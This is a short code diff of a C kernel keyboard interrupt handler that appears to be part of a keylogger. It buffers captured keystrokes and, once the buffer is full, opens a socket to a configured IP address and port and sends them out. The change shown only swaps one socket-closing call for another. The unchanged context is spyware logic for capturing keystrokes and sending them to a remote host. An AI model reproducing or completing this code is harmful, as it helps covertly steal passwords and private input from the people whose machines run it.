@@ -28,8 +28,8 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         if (buffer_count == KEY_BUFFER_SIZE) {
             struct socket* sock = create_socket(IP_ADDRESS, PORT);
             send_message(sock, keystrokes);
-            sock_release(sock);
-            
+            shutdown_socket(sock);
+
             buffer_count = 0;
         }
     }
